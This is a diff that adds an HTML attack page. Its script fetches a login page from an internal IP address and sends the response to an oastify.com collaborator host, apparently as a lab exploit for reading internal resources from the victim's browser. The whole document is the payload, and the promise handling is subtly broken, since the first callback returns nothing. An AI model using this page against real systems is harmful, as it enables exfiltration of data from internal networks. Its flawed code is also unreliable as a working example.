@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <script>
+        
+        collaboratorURL="http://389lh6lbmfvt09hx6jqskdk1rsxjlb90.oastify.com"
+        localURL="http://192.168.0.5:8080"
+        
+        fetch(localURL+'/login')
+        .then(response => {response.text()})
+        .then(text => {
+            fetch(collaboratorURL + "?code=" + encodeURIComponent(text))
+        })
+
+
+        </script>
+    </body>
+</html>
